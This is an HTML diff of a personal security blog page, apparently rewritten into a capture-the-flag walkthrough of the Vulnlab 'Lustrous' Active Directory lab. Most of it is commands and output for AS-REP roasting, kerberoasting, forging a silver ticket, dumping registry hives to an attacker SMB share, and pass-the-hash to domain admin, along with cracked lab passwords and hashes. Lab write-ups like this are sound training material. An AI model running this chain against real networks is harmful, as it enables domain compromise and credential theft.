@@ -9,32 +9,34 @@
     <meta name="generator" content="Retype 3.6.0">
 
     <!-- Primary Meta Tags -->
-    <title>About</title>
-    <meta name="title" content="About">
-    <meta name="description" content="Junior Red Teamer. Passionate about Windows binary exploitation.">
+    <title>Lustrous</title>
+    <meta name="title" content="Lustrous">
+    <meta name="description" content="IPs: 10.10.186.5 10.10.186.6">
 
     <!-- Canonical -->
-    <link rel="canonical" href="https://eljayright.github.io/">
+    <link rel="canonical" href="https://eljayright.github.io/writeups/vulnlab/lustrous/">
 
     <!-- Open Graph / Facebook -->
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://eljayright.github.io/">
-    <meta property="og:title" content="About">
-    <meta property="og:description" content="Junior Red Teamer. Passionate about Windows binary exploitation.">
+    <meta property="og:url" content="https://eljayright.github.io/writeups/vulnlab/lustrous/">
+    <meta property="og:title" content="Lustrous">
+    <meta property="og:description" content="IPs: 10.10.186.5 10.10.186.6">
+    <meta property="og:image" content="https://eljayright.github.io/writeups/vulnlab/lustrous/images/lustrous.png">
 
     <!-- Twitter -->
     <meta property="twitter:card" content="summary_large_image">
-    <meta property="twitter:url" content="https://eljayright.github.io/">
-    <meta property="twitter:title" content="About">
-    <meta property="twitter:description" content="Junior Red Teamer. Passionate about Windows binary exploitation.">
+    <meta property="twitter:url" content="https://eljayright.github.io/writeups/vulnlab/lustrous/">
+    <meta property="twitter:title" content="Lustrous">
+    <meta property="twitter:description" content="IPs: 10.10.186.5 10.10.186.6">
+    <meta property="twitter:image" content="https://eljayright.github.io/writeups/vulnlab/lustrous/images/lustrous.png">
 
     <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
 
-    <link href="resources/css/retype.css?v=3.6.0.781783905635" rel="stylesheet">
+    <link href="../../../resources/css/retype.css?v=3.6.0.781783905635" rel="stylesheet">
 
-    <script data-cfasync="false" src="resources/js/config.js?v=3.6.0.781783905635" data-turbo-eval="false" defer></script>
-    <script data-cfasync="false" src="resources/js/retype.js?v=3.6.0" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" data-cfasync="false" src="resources/js/lunr.js?v=3.6.0.781783905635" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../resources/js/config.js?v=3.6.0.781783905635" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../resources/js/retype.js?v=3.6.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../resources/js/lunr.js?v=3.6.0.781783905635" data-turbo-eval="false" defer></script>
 </head>
 <body>
     <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
@@ -49,7 +51,7 @@
                 <!-- Logo -->
                 <div class="flex items-center justify-between h-full py-2 md:w-75">
                     <div class="flex items-center px-2 md:px-6">
-                        <a id="docs-site-logo" href="" class="flex items-center leading-snug text-2xl">
+                        <a id="docs-site-logo" href="../../../" class="flex items-center leading-snug text-2xl">
                             <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">ElJayRight</span>
                         </a><span class="hidden px-2 py-1 ml-4 text-sm font-semibold leading-none text-root-logo-label-text bg-root-logo-label-bg rounded-sm md:inline-block">dev-notes</span>
                     </div>
@@ -177,26 +179,198 @@
                                 <!-- Rendered if sidebar right is enabled -->
                                 <div id="docs-sidebar-right-toggle"></div>
                                 <!-- Page content  -->
-<doc-anchor-target id="about" class="break-words">
+<doc-anchor-target id="lustrous" class="break-words">
     <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#about">#</doc-anchor-trigger>
-        <span>About</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#lustrous">#</doc-anchor-trigger>
+        <span>Lustrous</span>
     </h1>
 </doc-anchor-target>
-<p>Junior Red Teamer.
-Passionate about Windows binary exploitation.</p>
-<p>Interested in:</p>
-<ul>
-<li>EDR evasion and bypasses</li>
-<li>Active Directory exploitation</li>
-<li>Driver reversing and exploitation</li>
-</ul>
-<p>Currently looking at:</p>
-<ul>
-<li>Windows Userland Binary Exploitation</li>
-<li>&quot;Fixing&quot; Impackets kerberos flow</li>
-</ul>
-<p>More stuff coming soon :D</p>
+<p><figure class="content-center">
+    <img src="images/lustrous.png" alt="">
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>IPs: <code v-pre>10.10.186.5</code> <code v-pre>10.10.186.6</code></p>
+<doc-anchor-target id="recon">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#recon">#</doc-anchor-trigger>
+        <span>Recon</span>
+    </h1>
+</doc-anchor-target>
+<p>Nmap:
+10.10.186.5 - LusDC.lustrous.vl</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">21/tcp   open  ftp           Microsoft ftpd
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Microsoft IIS httpd 10.0
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-07 10:05:13Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: lustrous.vl0., Site: Default-First-Site-Name)
+443/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: lustrous.vl0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</code></pre>
+</doc-codeblock></div>
+<p>10.10.186.6 - LusMS.lustrous.vl</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</code></pre>
+</doc-codeblock></div>
+<p>FTP:
+Anonymous auth is allowed and in the directory there are 4 potential users:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">ben.cox
+rachel.parker
+tony.ward
+wayne.taylor</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="foothold">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#foothold">#</doc-anchor-trigger>
+        <span>Foothold</span>
+    </h1>
+</doc-anchor-target>
+<p>Going to try asreproasting.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">GetNPUsers.py -no-pass -usersfile ~/vulnlab/lustrous/users.txt lustrous.vl/
+
+$krb5asrep$23$ben.cox@LUSTROUS.VL:7c8ba100fb64758aaae0b5e3ac5c30ac$b7919abb1a2c111bdac822955214a080aaef77f20e70295e061600b83c625c696292eae4c291357e1e536b2dce0fbb4da175d6a275c8955426b8db7ae74fab7e6fc2ca2184e37e7021e10c976428bbe816474da75a3d0f027c226fc1b225b3c9125a70e824ddf2c4312414a84977697999225cc793d8feb6c6af131d81245a0d31cf874795c30185e733852a4904e8099fe1f78edcdf2e33ade2cb10e5301daa81874d6deb2bdff57de56c88ef39503d289f410ae3ab9482d9dfc086b4f6157d5110ec9c46a272938006d36c4fca42dbc09c2378ae83c82266cca9bd2d2d3d71a84f3a56c1398210b2f6</code></pre>
+</doc-codeblock></div>
+<p>This cracks to <code v-pre>Trinity1</code></p>
+<doc-anchor-target id="ldap-analysis">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#ldap-analysis">#</doc-anchor-trigger>
+        <span>LDAP Analysis</span>
+    </h1>
+</doc-anchor-target>
+<p>As we now have domain creds, and there isnt any more low hanging fruit I&#x27;m going to run a bloodhound scan:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">./bloodhound.py -d lustrous.vl -u ben.cox -p Trinity1 -c all -ns 10.10.186.5 --zip -dc LusDC.lustrous.vl</code></pre>
+</doc-codeblock></div>
+<p>There are 2 kerberoastable accounts, being:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">svc_db
+svc_web</code></pre>
+</doc-codeblock></div>
+<p>The tony.ward user has generic write over the domain admins group, and is also a member of the backup operators.</p>
+<doc-anchor-target id="lateral-movement">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#lateral-movement">#</doc-anchor-trigger>
+        <span>Lateral Movement</span>
+    </h1>
+</doc-anchor-target>
+<p>The <code v-pre>svc_web</code> account has a SPN for <code v-pre>http://lusdc.lustrous.vl</code>, going to this site returns a 401 due to invalid creds. If we are able to compromise this account via kerberoasting we should be able to auth to the web app using kerberos.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">GetUserSPNs.py lustrous.vl/ben.cox:Trinity1 -request
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName     Name     MemberOf  PasswordLastSet             LastLogon                   Delegation 
+-----------------------  -------  --------  --------------------------  --------------------------  ----------
+http/lusdc.lustrous.vl   svc_web            2021-12-22 23:46:12.670282  2024-10-07 21:05:33.010187             
+
+
+[-] CCache file is not found. Skipping...
+... snip ...</code></pre>
+</doc-codeblock></div>
+<p>This ticket also cracks to <code v-pre>iydgTvmujl6f</code>. Using this we can create a silver ticket for any user to auth to the web application. I&#x27;m going to use the <code v-pre>tony.ward</code> user as he might have special privs in the context of the web app too.</p>
+<p>to do this we need the nthash of service account, the domain sid (from bloodhound) and the user-id (also in bloodhound)</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">$ pypykatz crypto nt iydgTvmujl6f
+e67af8b3d78df5a02eb0d57b6cb60717</code></pre>
+</doc-codeblock></div>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">$ ticketer.py -nthash e67af8b3d78df5a02eb0d57b6cb60717 -domain-sid S-1-5-21-2355092754-1584501958-1513963426 -domain lustrous.vl -user-id 1114 -spn http/lusdc.lustrous.vl tony.ward
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*]     PAC_LOGON_INFO
+[*]     PAC_CLIENT_INFO_TYPE
+[*]     EncTicketPart
+[*]     EncTGSRepPart
+[*] Signing/Encrypting final ticket
+[*]     PAC_SERVER_CHECKSUM
+[*]     PAC_PRIVSVR_CHECKSUM
+[*]     EncTicketPart
+[*]     EncTGSRepPart
+[*] Saving ticket in tony.ward.ccache</code></pre>
+</doc-codeblock></div>
+<p>Then in firefox update <code v-pre>network.negotiate-auth.trusted-uris</code> to <code v-pre>https://lusdc.lustrous.vl</code>, export the ticket and start firefox.</p>
+<p>You can also do it via curl:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">KRB5CCNAME=$(pwd)/tony.ward.ccache curl -k --negotiate -u : https://lusdc.lustrous.vl</code></pre>
+</doc-codeblock></div>
+<p>Going to the /Internal endpoint shows a password reminder note for tony.ward</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">U_cPVQqEI50i1X</code></pre>
+</doc-codeblock></div>
+<p>Checking if its a valid domain credential:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">nxc ldap lusdc -u tony.ward -p U_cPVQqEI50i1X
+SMB         10.10.186.5     445    LUSDC            [*] Windows Server 2022 Build 20348 x64 (name:LUSDC) (domain:lustrous.vl) (signing:True) (SMBv1:False)
+LDAP        10.10.186.5     389    LUSDC            [+] lustrous.vl\tony.ward:U_cPVQqEI50i1X (Pwn3d!)</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="domain-admin">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#domain-admin">#</doc-anchor-trigger>
+        <span>Domain Admin</span>
+    </h1>
+</doc-anchor-target>
+<p>As <code v-pre>tony.ward</code> is a member of the backup operators we can use <code v-pre>reg.py</code> to dump the SAM and SECURITY hives. To do this we have to start a smbserver</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">$ smbserver.py -smb2support share ~/vulnlab/lustrous/
+
+$ reg.py lustrous.vl/tony.ward:U_cPVQqEI50i1X@lusdc backup -o \\\\10.8.0.110\\share</code></pre>
+</doc-codeblock></div>
+<p>This was very unstable and I couldnt get it to work, so instead, I&#x27;m going to do it from a windows machine. What we can do is login via winrm as ben.cox and then  use runas to execute BackupOperators.cpp as tony.ward to exfiltrate the hives.</p>
+<p>updating the machine name on line 31 in <code v-pre>BackupOperators.cpp</code> and its good to go.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">.\runascs.exe tony.ward U_cPVQqEI50i1X -d lustrous.vl C:\Windows\Tasks\backup.exe
+Dumping SAM hive to C:\windows\temp\sam.hive
+Dumping SYSTEM hive to C:\windows\temp\system.hive
+Dumping SECURITY hive to C:\windows\temp\security.hive</code></pre>
+</doc-codeblock></div>
+<p>Then just grab the files with smbclient, make sure you are in the <code v-pre>C:\Windows\temp</code> folder when grabbing the files due to windows icacls on the temp folder.</p>
+<p>Then dumping the machine hash</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">secretsdump.py LOCAL -sam ~/vulnlab/lustrous/sam.hive -system ~/vulnlab/lustrous/system.hive -security ~/vulnlab/lustrous/security.hive 
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+... snip ...
+$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:7f5111dad29fb429fe1222126a156a63</code></pre>
+</doc-codeblock></div>
+<p>Now we can grab the DA hash.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">$ secretsdump.py -hashes :7f5111dad29fb429fe1222126a156a63 lustrous.vl/LUSDC\$@lusdc                                                    
+... snip ...
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:b8d9c7bd6de2a14237e0eff1afda2476::: </code></pre>
+</doc-codeblock></div>
+<p>Finally login with evil-winrm</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">evil-winrm -u Administrator -H b8d9c7bd6de2a14237e0eff1afda2476 -i lusdc
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
+lustrous\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; hostname
+LusDC</code></pre>
+</doc-codeblock></div>
+<p>Fin</p>
+<doc-anchor-target id="beyond-root">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#beyond-root">#</doc-anchor-trigger>
+        <span>Beyond Root</span>
+    </h1>
+</doc-anchor-target>
+<p>Had a lot of fun, got stuck trying to dump the registries remotely with reg.py for some reason the server kept closing the connection. I also played around with changing BackupOperators.cpp to dump to a share, which worked.</p>
+<p>There is also a cool trick to kerberoast a user from an asrep ticket, which would have been useful if the ben.cox ticket didnt crack, you would then also have to set up a windows box so you could dump the sam and system hives. This should still work as you can add a DNS entry to a random ip by default in AD.</p>
 
                                 
                                 <!-- Required only on API pages -->
@@ -206,13 +380,20 @@ Passionate about Windows binary exploitation.</p>
                             
                                 <nav class="flex mt-14">
                                     <div class="w-1/2">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../writeups/vulnlab/hybrid/">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                            <span>
+                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
+                                                <span class="block mt-1">Hybrid</span>
+                                            </span>
+                                        </a>
                                     </div>
                             
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l rounded-r-lg transition-colors duration-150 relative hover:z-5" href="research/linux_kerb_tickets/">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../writeups/vulnlab/trusted/">
                                             <span>
                                                 <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
-                                                <span class="block mt-1">Making Linux Kerberos Tickets Not Bad</span>
+                                                <span class="block mt-1">Trusted</span>
                                             </span>
                                             <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                         </a>
@@ -256,6 +437,6 @@ Passionate about Windows binary exploitation.</p>
 
     <div id="docs-overlay-target"></div>
 
-    <script data-cfasync="false">window.__DOCS__ = { "title": "About", isRoot: true, level: 0, icon: "file", hasPrism: false, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+    <script data-cfasync="false">window.__DOCS__ = { "title": "Lustrous", level: 3, icon: "file", hasPrism: false, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
 </body>
 </html>
